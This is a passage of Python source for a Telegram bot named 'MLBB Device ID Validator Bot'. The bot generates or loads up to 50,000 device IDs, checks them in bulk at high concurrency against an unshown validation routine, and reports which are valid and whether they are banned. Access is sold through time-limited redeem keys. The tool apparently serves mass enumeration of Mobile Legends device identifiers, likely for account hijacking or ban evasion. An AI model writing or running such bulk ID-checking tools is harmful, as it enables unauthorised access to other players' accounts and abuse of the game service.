                        filename=f"BANNED_{banned_count}.txt",
                        caption=f"🚫 {banned_count} banned devices found"
                    )
                os.remove(banned_file)
                
                # Show first few banned
                report_lines.append("**Sample Banned Devices:**")
                for did, info in results["banned"][:5]:
                    reason = info.get('reason_name', 'Unknown')
                    report_lines.append(f"• `{did[:20]}...` - {reason}")
                if banned_count > 5:
                    report_lines.append(f"... and {banned_count - 5} more")
            
            if results["clean"]:
                # Create clean file
                clean_file = f"clean_{user_id}_{int(time.time())}.txt"
                with open(clean_file, 'w', encoding='utf-8') as f:
                    for did in results["clean"]:
                        f.write(f"{did}\n")
                
                with open(clean_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id, f,
                        filename=f"CLEAN_{clean_count}.txt",
                        caption=f"✅ {clean_count} clean devices found"
                    )
                os.remove(clean_file)
            
            await status_msg.edit_text("\n".join(report_lines), parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Bulk ban check error: {e}")
            await status_msg.edit_text(f"❌ Error: {str(e)}")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        # Handle bulk ban file
        if context.user_data.get('mode') == 'bulk_ban' and update.message.document:
            await self.handle_bulk_ban_file(update, context)
            context.user_data['mode'] = None
            return
        
        # Handle ban check mode
        if context.user_data.get('mode') == 'ban_check' and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access.")
                return
            device_id = update.message.text.strip()
            context.user_data['mode'] = None
            context.args = [device_id]
            await self.check_ban_cmd(update, context)
            return
        
        # Handle single check mode
        if context.user_data.get('mode') == 'single_check' and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access.")
                return
            device_id = update.message.text.strip()
            context.user_data['mode'] = None
            context.args = [device_id]
            await self.check_cmd(update, context)
            return
        
        if context.user_data.get('mode') == 'generate' and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access.")
                return
            try:
                count = int(update.message.text)
                if count <= 0 or count > 50000:
                    await update.message.reply_text("Number between 1 and 50000")
                    return
                await update.message.reply_text(f"🎲 Generating {count:,} IDs...")
                context.user_data['mode'] = None
                asyncio.create_task(self.run_check_task(update, context, count, 'generate'))
            except ValueError:
                await update.message.reply_text("Send a valid number")
        elif update.message.document:
            if not self._check_access(user_id):
                await update.message.reply_text("❌ No access.")
                return
            file = update.message.document
            if not file.file_name.endswith('.txt'):
                await update.message.reply_text("Send a .txt file")
                return
            status_msg = await update.message.reply_text(f"📥 Downloading {file.file_name}...")
            file_obj = await file.get_file()
            file_path = f"temp_{user_id}_{int(time.time())}.txt"
            await file_obj.download_to_drive(file_path)
            ids = _load_pool(file_path)
            os.remove(file_path)
            if not ids:
                await status_msg.edit_text("❌ No valid IDs found.")
                return
            await status_msg.edit_text(f"✅ Loaded {len(ids):,} IDs. Starting...")
            context.user_data['mode'] = None
            asyncio.create_task(self.run_check_task(update, context, ids, 'file'))

    async def run_check_task(self, update: Update, context: ContextTypes.DEFAULT_TYPE, data, mode: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        self.active_tasks[user_id] = {'done': False, 'cancelled': False}
        stats = LiveStats()
        self.live_stats[user_id] = stats
        status_msg = None
        stats_msg = None
        try:
            if mode == 'generate':
                ids = [_gen() for _ in range(data)]
                limit = data
            else:
                ids = data[:]
                limit = len(ids)
            concurrency = 80
            rate = 80
            sem = asyncio.Semaphore(concurrency)
            bucket = _Bucket(rate)
            lock = asyncio.Lock()
            checked = 0
            valid = 0
            failed = 0
            results = []
            start_time = time.monotonic()
            last_update = 0

            async def worker(did):
                nonlocal checked, valid, failed
                if self.active_tasks[user_id]['cancelled']:
                    return
                res = await _check(did, sem, bucket)
                async with lock:
                    checked += 1
                    if res:
                        valid += 1
                        results.append(res)
                        stats.add_hit(res)
                    else:
                        failed += 1
                        stats.add_unreg()
                    # Quick ban check for valid IDs
                    if res:
                        loop = asyncio.get_event_loop()
                        status, _ = await loop.run_in_executor(
                            self._executor, check_device_ban_silent, did
                        )
                        stats.add_ban_result(status)

            tasks = [asyncio.create_task(worker(did)) for did in ids]
            while not all(t.done() for t in tasks) and not self.active_tasks[user_id]['cancelled']:
                elapsed = time.monotonic() - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                progress = (checked / limit * 100) if limit > 0 else 0
                eta = (limit - checked) / speed if speed > 0 else 0
                eta_m = int(eta // 60)
                eta_s = int(eta % 60)
                if time.monotonic() - last_update >= 2:
                    last_update = time.monotonic()
                    bar_len = 20
                    filled = int(progress / 100 * bar_len)
                    bar = '█' * filled + '░' * (bar_len - filled)
                    progress_text = (
                        f"⚡ [{bar}] {progress:.1f}%\n\n"
                        f"✅ {checked:,}/{limit:,} | 🟢 {valid:,}\n"
                        f"❌ {failed:,} | ⚡ {speed:.1f}/s\n"
                        f"⏱ {int(elapsed // 60)}m {int(elapsed % 60)}s | ⏳ {eta_m}m {eta_s}s\n"
                    )
                    stats_text = stats.format()
                    try:
                        if status_msg:
                            await status_msg.edit_text(progress_text)
                        else:
                            status_msg = await context.bot.send_message(chat_id, progress_text)
                    except Exception:
                        pass
                    try:
                        if stats_msg:
                            await stats_msg.edit_text(stats_text)
                        else:
                            stats_msg = await context.bot.send_message(chat_id, stats_text)
                    except Exception:
                        pass
                await asyncio.sleep(1)

            await asyncio.gather(*tasks, return_exceptions=True)
            self.active_tasks[user_id]['done'] = True
            elapsed = time.monotonic() - start_time

            if results:
                output_file = f"{valid}DevId_Valid.txt"
                with open(output_file, 'w', encoding='utf-8') as f:
                    for res in results:
                        f.write(format_result_line(res) + "\n")
                with open(output_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id, f,
                        filename=output_file,
                        caption=f"✅ Found {len(results):,} valid IDs!"
                    )
                os.remove(output_file)
            else:
                await context.bot.send_message(chat_id, "❌ No valid IDs found.")

            final_progress = (
                f"✅ Task Complete!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Total checked : {checked:,}\n"
                f"Valid found   : {valid:,}\n"
                f"Failed        : {failed:,}\n"
                f"Success rate  : {(valid / checked * 100) if checked > 0 else 0:.2f}%\n"
                f"Total time    : {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
                f"Avg speed     : {checked / elapsed:.1f}/s\n"
            )
            final_stats = (
                f"📊 Final Stats\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{stats.format()}"
            )
            try:
                if status_msg:
                    await status_msg.edit_text(final_progress)
                else:
                    await context.bot.send_message(chat_id, final_progress)
            except Exception:
                await context.bot.send_message(chat_id, final_progress)
            try:
                if stats_msg:
                    await stats_msg.edit_text(final_stats)
                else:
                    await context.bot.send_message(chat_id, final_stats)
            except Exception:
                await context.bot.send_message(chat_id, final_stats)

        except Exception as e:
            logger.error(f"Task error: {e}")
            await context.bot.send_message(chat_id, f"❌ Error: {str(e)}")
        finally:
            self.active_tasks[user_id]['done'] = True
            self.live_stats.pop(user_id, None)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        if data == "check_file":
            await self.check_file(update, context)
        elif data == "check_single":
            await self.check_single(update, context)
        elif data == "check_ban":
            await self.check_ban_callback(update, context)
        elif data == "bulk_ban_check":
            await self.bulk_ban_check_callback(update, context)
        elif data == "generate":
            await self.generate(update, context)
        elif data == "my_status":
            await self.my_status(update, context)
        elif data == "admin_panel":
            await self.admin_panel(update, context)
        elif data == "admin_genkey":
            await self.admin_genkey_panel(update, context)
        elif data == "admin_listkeys":
            await self.admin_listkeys_panel(update, context)
        elif data == "admin_listusers":
            await self.admin_listusers_panel(update, context)
        elif data == "back_main":
            await query.answer()
            has_access = self._check_access(user_id)
            is_admin = self._is_admin(user_id)
            expiry = key_manager.get_expiry(user_id)
            if is_admin:
                status_line = "Role: Admin"
            elif has_access:
                status_line = f"Access until: {expiry}"
            else:
                status_line = "No active access"
            keyboard = []
            if has_access or is_admin:
                keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
                keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
                keyboard.append([InlineKeyboardButton("🔍 Check Single ID", callback_data="check_single")])
                keyboard.append([InlineKeyboardButton("🚫 Check Ban Status", callback_data="check_ban")])
                keyboard.append([InlineKeyboardButton("🚫 Bulk Ban Check", callback_data="bulk_ban_check")])
            if is_admin:
                keyboard.append([InlineKeyboardButton("🔑 Admin Panel", callback_data="admin_panel")])
            keyboard.append([InlineKeyboardButton("📋 My Status", callback_data="my_status")])
            await query.edit_message_text(
                f"MLBB Device ID Validator Bot\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{status_line}",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif data.startswith("genkey_"):
            if not self._is_admin(user_id):
                await query.answer("❌", show_alert=True)
                return
            duration_map = {
                "genkey_1h": ("1h", "1 hour"),
                "genkey_6h": ("6h", "6 hours"),
                "genkey_12h": ("12h", "12 hours"),
                "genkey_1d": ("1d", "1 day"),
                "genkey_3d": ("3d", "3 days"),
                "genkey_7d": ("7d", "7 days"),
                "genkey_14d": ("14d", "14 days"),
                "genkey_1m": ("1m", "1 month"),
                "genkey_3m": ("3m", "3 months"),
                "genkey_6m": ("6m", "6 months"),
                "genkey_1y": ("1y", "1 year"),
            }
            if data not in duration_map:
                await query.answer("Unknown.", show_alert=True)
                return
            dur_str, dur_label = duration_map[data]
            seconds, label = parse_duration(dur_str)
            if seconds is None:
                await query.answer("Error.", show_alert=True)
                return
            key = key_manager.generate_key(seconds, label, user_id)
            await query.answer()
            keyboard = [
                [InlineKeyboardButton("🔑 Generate Another", callback_data="admin_genkey")],
                [InlineKeyboardButton("◀ Admin Panel", callback_data="admin_panel")]
            ]
            await query.edit_message_text(
                f"✅ Key Generated!\n\nKey: `{key}`\nDuration: {label}\n\nRedeem: `/redeem {key}`",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )


def main():
    bot = MLBBBot()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("help", bot.help))
    application.add_handler(CommandHandler("check", bot.check_cmd))
    application.add_handler(CommandHandler("bancheck", bot.check_ban_cmd))
    application.add_handler(CommandHandler("redeem", bot.redeem_cmd))
    application.add_handler(CommandHandler("genkey", bot.genkey_cmd))
    application.add_handler(CommandHandler("listkeys", bot.listkeys_cmd))
    application.add_handler(CommandHandler("listusers", bot.listusers_cmd))
    application.add_handler(CommandHandler("revoke", bot.revoke_cmd))
    application.add_handler(CommandHandler("delkey", bot.delkey_cmd))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
    print("MLBB Bot started!")
    print("Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
